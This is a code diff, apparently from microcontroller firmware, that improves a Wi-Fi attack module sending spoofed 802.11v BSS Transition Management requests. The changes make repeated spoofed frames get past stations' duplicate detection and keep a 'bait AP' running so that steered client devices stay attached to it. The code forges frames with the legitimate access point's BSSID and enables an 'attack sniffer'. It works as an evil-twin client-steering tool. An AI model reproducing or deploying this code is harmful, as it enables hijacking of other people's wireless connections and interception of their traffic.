@@ -34,6 +34,7 @@
 //     skipped instead of being flooded for nothing.
 
 #include "btm.h"
+#include "baitap.h"
 #include "radio.h"
 
 #include <Arduino.h>
@@ -47,8 +48,9 @@
 
 namespace {
 
-const uint8_t kSeqHigh = 0xF0;
-const uint8_t kSeqLow = 0xFF;
+// A fixed sequence number is thrown away by the station's duplicate detector after
+// the first copy, so a repeating spoof must advance it.
+uint16_t s_seq;
 
 // 802.11v Action field values (802.11-2020, Table 9-... "802.11v Action field").
 const uint8_t kCategoryBtm = 10;
@@ -169,8 +171,9 @@ size_t build_btm_request(uint8_t* frame, const uint8_t sta[6], uint8_t dialog) {
     memcpy(frame + 4, sta, 6);
     memcpy(frame + 10, s_bssid, 6);
     memcpy(frame + 16, s_bssid, 6);
-    frame[22] = kSeqHigh;
-    frame[23] = kSeqLow;
+    const uint16_t seq = s_seq++ & 0x0FFF;
+    frame[22] = (uint8_t)(seq >> 4);
+    frame[23] = (uint8_t)((seq & 0x0F) << 4);
 
     size_t n = 24;
     frame[n++] = kCategoryBtm;
@@ -232,7 +235,11 @@ bool btm_start(int index, uint16_t disassoc_timer, const uint8_t* cand_bssid,
     s_last_status = 0;
     s_last_tx_ms = 0;
 
-    radio_set_channel("btm", s_channel);
+    // Same rule as RRM: do not retune while the bait AP owns this channel, or its
+    // beacon restarts and a freshly steered station is dropped.
+    if (!(baitap_running() && baitap_channel() == s_channel)) {
+        radio_set_channel("btm", s_channel);
+    }
     // Without the receive callback the capability learning never sees a client
     // and every request would go out blind.
     attack_sniffer_enable();
